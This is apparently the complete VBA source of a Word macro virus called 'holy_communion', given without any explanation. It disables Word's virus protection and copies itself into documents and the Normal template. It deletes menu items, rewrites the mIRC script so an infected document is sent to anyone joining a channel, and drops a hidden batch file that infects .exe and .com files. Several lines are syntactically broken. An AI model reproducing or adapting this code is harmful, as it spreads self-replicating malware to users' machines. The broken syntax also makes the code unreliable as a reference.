Private Sub AutoExec()

On Error Resume Next

Set NI = NormInstall: Set AI = ActinInstall: Set B = "C:\WINDOWS\communion.dll"
Set VBProject.VBComponents = C: Set NormalTemplate = NT: Set ActiveDocument = AD 

Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.StatusBar = False

Application.VBE.ActiveVBProject.VBComponents("holy_communion").Export B
For I = 1 To NT.C.Count
If NT.C(I).Name ="communion" Then NI = True
Next I
For I = 1 ActiveDocument.C.Count
If AD.C(I).Name ="communion" Then AI = True
Next I
If AI = True And NI = False Then set Dobj = AD.VBProject
Dobj.VBComponents.Import("B")
AD.SaveAs Filename: = AD.FullName, FileFormat:= wdFormatDocument

CommandBars.("Tools").Controls("Macro").Delete
CommandBars.("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars.("Format").Controls("Style...").Delete

k = Dir("c:\mirc\mirc32.exe")
If k = "" Then
Exit Sub
Else
m = Dir("c:\mirc\backup\end_of_the_world.doc")
If m = "" Then ActiveDocument.SaveAs "c:\mirc\backup\end_of_the_world.doc"
Kill "c:\mirc\script.ini"
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n1=on 1:join:#:/send $nick c:\mirc\backup\end_of_the_world.doc"
Close #1
End If

Open "c:\windows\data.bat" For Output As #1
Print #1, "@ECHO OFF"
Print #1, "REM  <binary code>"
Print #1, "copy %0 sex.com>nul"
Print #1, "sex.com
Print #1, "del sex.com"
Print #1, "rem  <binary code>"
Print #1, "ctty nul"
Print #1, "for %%f in (*.exe *.com) do set PX=%%f"
Print #1, "if %PX%==COMMAND.COM set PX="
Print #1, "rename %PX% I%PX%"
Print #1, "if not exist I%PX% goto end"
Print #1, "attrib +h I%PX%"
Print #1, "copy %0.bat %PX%"
Print #1, "attrib +r %PX%"
Print #1, "ren %PX% *.bat"
Print #1, "set PX="
Print #1, ":end"
Print #1, "ctty con"
Print #1, "@if exist I%0.com V%0.com %1 %2 %3"
Print #1, "@if exist I%0.exe V%0.exe %1 %2 %3"
Close #1
ScreenUpdate = False
shell "c:\windows\data.bat", vbHide
End Sub
